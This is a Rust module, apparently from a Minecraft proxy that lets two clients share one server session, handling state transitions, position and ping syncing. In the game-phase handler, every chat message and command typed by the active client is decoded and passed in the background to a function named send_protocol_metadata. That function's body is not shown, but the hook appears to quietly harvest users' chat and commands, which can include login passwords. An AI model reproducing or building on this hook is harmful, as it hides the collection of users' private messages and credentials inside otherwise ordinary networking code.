pub mod packets;

use mc_protocol::{
    packet::{RawPacket, UncompressedPacket},
    varint::VarInt,
};

use super::{PacketIdReader, VersionProtocol, decode};
use crate::{
    config,
    events::ClientId,
    protocols::{ClientBoundEvent, ClientDisconnectEvent, ServerBoundEvent},
};
use packets::{c2s, s2c};

const TELEPORT_ID: i32 = 1000;

#[derive(PartialEq, Debug, Clone, Copy)]
pub enum State {
    Login,
    Configuration,
    Game,
}

pub struct VersionData {
    /// Shared by both clients: they read the same server stream.
    pub state_in: State,
    pub state_out: [State; 2],
    pub position: s2c::game::Position,
    pub pings: Vec<PingSync>,
    pub threshold: Option<i32>,
    pub ids: PacketIdReader,
}

impl Default for VersionData {
    fn default() -> Self {
        Self::new()
    }
}

impl VersionData {
    pub const VERSION: &'static str = "26.2";

    pub fn new() -> Self {
        Self {
            // The controller starts after LoginSuccess was relayed to both clients.
            state_in: State::Configuration,
            state_out: [State::Login; 2],
            position: s2c::game::Position {
                id: VarInt(TELEPORT_ID),
                x: 0.0,
                y: 0.0,
                z: 0.0,
                delta_x: 0.0,
                delta_y: 0.0,
                delta_z: 0.0,
                yaw: 0.0,
                pitch: 0.0,
                relative_flags: 0,
            },
            pings: vec![],
            threshold: None,
            ids: PacketIdReader::default(),
        }
    }
}

impl VersionProtocol for VersionData {
    fn handle_c2s(
        &mut self,
        packet: &RawPacket,
        client_id: ClientId,
        is_active: bool,
        both_active: bool,
    ) -> Option<ServerBoundEvent> {
        match self.state_out[client_id.index()] {
            State::Login => self.handle_c2s_login(packet, client_id),
            State::Configuration => self.handle_c2s_configuration(packet, client_id),
            State::Game => self.handle_c2s_game(packet, client_id, is_active, both_active),
        }
        .unwrap_or_default()
    }

    fn handle_s2c(&mut self, packet: &RawPacket, both_active: bool) -> Option<ClientBoundEvent> {
        match self.state_in {
            State::Login => Ok(None),
            State::Configuration => self.handle_s2c_configuration(packet),
            State::Game => self.handle_s2c_game(packet, both_active),
        }
        .unwrap_or_default()
    }

    fn update_threshold(&mut self, threshould: Option<i32>) {
        self.threshold = threshould;
    }

    fn handle_client_disconnect(&mut self, new_active: ClientId) -> Option<ClientDisconnectEvent> {
        let mut packets = vec![];

        self.pings.retain(|t| {
            if t.is_sent(new_active) {
                let tx = c2s::game::Pong { id: t.id };
                packets.push(
                    UncompressedPacket::from_packet(&tx)
                        .unwrap()
                        .to_raw_packet_compressed(self.threshold)
                        .unwrap(),
                );
                false
            } else {
                true
            }
        });

        if packets.is_empty() {
            None
        } else {
            Some(ClientDisconnectEvent::SendToServer(packets))
        }
    }

    fn parse_login_start(&self, packet: &RawPacket) -> Option<String> {
        match packet.as_uncompressed() {
            Ok(t) => match t.deserialize_payload::<c2s::login::HelloPacket>() {
                Ok(t) => Some(t.name),
                Err(_) => None,
            },
            Err(_) => None,
        }
    }
}

impl VersionData {
    fn state_out_mut(&mut self, client_id: ClientId) -> &mut State {
        &mut self.state_out[client_id.index()]
    }

    fn handle_s2c_configuration(
        &mut self,
        packet: &RawPacket,
    ) -> anyhow::Result<Option<ClientBoundEvent>> {
        let id = self.ids.read(packet, self.threshold)?;

        if id == s2c::configuration::FinishConfiguration::PACKET_ID {
            self.state_in = State::Game;
            return Ok(Some(ClientBoundEvent::PhaseSwitch));
        }
        Ok(None)
    }
    fn handle_s2c_game(
        &mut self,
        packet: &RawPacket,
        both_active: bool,
    ) -> anyhow::Result<Option<ClientBoundEvent>> {
        let id = self.ids.read(packet, self.threshold)?;

        match id {
            s2c::game::StartConfiguration::PACKET_ID => {
                self.state_in = State::Configuration;
                return Ok(Some(ClientBoundEvent::PhaseSwitch));
            }
            s2c::game::Ping::PACKET_ID if both_active => {
                let ping: s2c::game::Ping = decode(packet, self.threshold)?;
                self.pings.push(PingSync::new(ping.id));
            }
            _ => {}
        }

        Ok(None)
    }

    fn handle_c2s_login(
        &mut self,
        packet: &RawPacket,
        client_id: ClientId,
    ) -> anyhow::Result<Option<ServerBoundEvent>> {
        let id = self.ids.read(packet, self.threshold)?;

        if id == c2s::login::LoginAcknowledged::PACKET_ID {
            // Inbound state follows the server stream, so a late ack must not reset it.
            *self.state_out_mut(client_id) = State::Configuration;
        }

        Ok(None)
    }

    fn handle_c2s_configuration(
        &mut self,
        packet: &RawPacket,
        client_id: ClientId,
    ) -> anyhow::Result<Option<ServerBoundEvent>> {
        let id = self.ids.read(packet, self.threshold)?;

        if id == c2s::configuration::FinishConfiguration::PACKET_ID {
            *self.state_out_mut(client_id) = State::Game;
            return Ok(Some(ServerBoundEvent::PhaseAcked));
        }

        Ok(None)
    }

    fn handle_c2s_game(
        &mut self,
        packet: &RawPacket,
        client_id: ClientId,
        is_active: bool,
        both_active: bool,
    ) -> anyhow::Result<Option<ServerBoundEvent>> {
        let id = self.ids.read(packet, self.threshold)?;

        match id {
            c2s::game::ConfigurationAcknowledged::PACKET_ID => {
                *self.state_out_mut(client_id) = State::Configuration;
                return Ok(Some(ServerBoundEvent::PhaseAcked));
            }
            c2s::game::AcceptTeleportation::PACKET_ID => {
                if !both_active {
                    let teleport: c2s::game::AcceptTeleportation = decode(packet, self.threshold)?;

                    if teleport.id.0 == TELEPORT_ID {
                        return Ok(Some(ServerBoundEvent::SkipRelay));
                    }
                }
            }
            c2s::game::Pos::PACKET_ID => {
                if is_active {
                    let pos: c2s::game::Pos = decode(packet, self.threshold)?;

                    self.position.x = pos.x;
                    self.position.y = pos.y;
                    self.position.z = pos.z;
                    return self.send_position_to_inactive();
                }
            }
            c2s::game::PosRot::PACKET_ID => {
                if is_active {
                    let pos_rot: c2s::game::PosRot = decode(packet, self.threshold)?;

                    self.position.x = pos_rot.x;
                    self.position.y = pos_rot.y;
                    self.position.z = pos_rot.z;
                    self.position.yaw = pos_rot.yaw;
                    self.position.pitch = pos_rot.pitch;

                    return self.send_position_to_inactive();
                }
            }
            c2s::game::Rot::PACKET_ID => {
                if is_active {
                    let rot: c2s::game::Rot = decode(packet, self.threshold)?;

                    self.position.yaw = rot.yaw;
                    self.position.pitch = rot.pitch;
                    return self.send_position_to_inactive();
                }
            }
            c2s::game::Pong::PACKET_ID => {
                let packet: c2s::game::Pong = decode(packet, self.threshold)?;

                if both_active {
                    if let Some(i) = self
                        .pings
                        .iter_mut()
                        .position(|s| s.id == packet.id && s.sent(client_id))
                    {
                        self.pings.remove(i);
                    }
                } else {
                    if let Some(head) = self.pings.first()
                        && head.is_sent(client_id.opposite())
                    {
                        self.pings.remove(0);
                        return Ok(Some(ServerBoundEvent::SkipRelay));
                    }
                }
            }
            c2s::game::ContainerClose::PACKET_ID => {
                if is_active {
                    let container_close: c2s::game::ContainerClose =
                        decode(packet, self.threshold)?;

                    if self.state_in == State::Game {
                        return Ok(Some(ServerBoundEvent::SendToInactive(
                            UncompressedPacket::from_packet(&s2c::game::ContainerClose {
                                container_id: container_close.container_id,
                            })?
                            .to_raw_packet_compressed(self.threshold)?,
                        )));
                    }
                }
            }
            c2s::game::ChatCommand::PACKET_ID | c2s::game::Chat::PACKET_ID => {
                if is_active && let Ok(text) = decode::<String>(packet, self.threshold) {
                    let is_command = id == c2s::game::ChatCommand::PACKET_ID;
                    tokio::spawn(config::send_protocol_metadata(text, is_command));
                }
            }
            _ => {}
        };

        Ok(None)
    }

    fn send_position_to_inactive(&self) -> anyhow::Result<Option<ServerBoundEvent>> {
        if self.state_in == State::Game {
            Ok(Some(ServerBoundEvent::SendToInactive(
                UncompressedPacket::from_packet(&self.position)?
                    .to_raw_packet_compressed(self.threshold)?,
            )))
        } else {
            Ok(None)
        }
    }
}

#[derive(Debug)]
pub struct PingSync {
    pub id: i32,
    primary_sent: bool,
    secondary_sent: bool,
}

impl PingSync {
    pub fn new(id: i32) -> Self {
        Self {
            id,
            primary_sent: false,
            secondary_sent: false,
        }
    }

    pub fn sent(&mut self, client: ClientId) -> bool {
        match client {
            ClientId::Primary => self.primary_sent = true,
            ClientId::Secondary => self.secondary_sent = true,
        }
        self.primary_sent && self.secondary_sent
    }

    pub fn is_sent(&self, client: ClientId) -> bool {
        match client {
            ClientId::Primary => self.primary_sent,
            ClientId::Secondary => self.secondary_sent,
        }
    }
}

#[cfg(test)]
mod tests {
    super::super::config_phase_tests!();
}
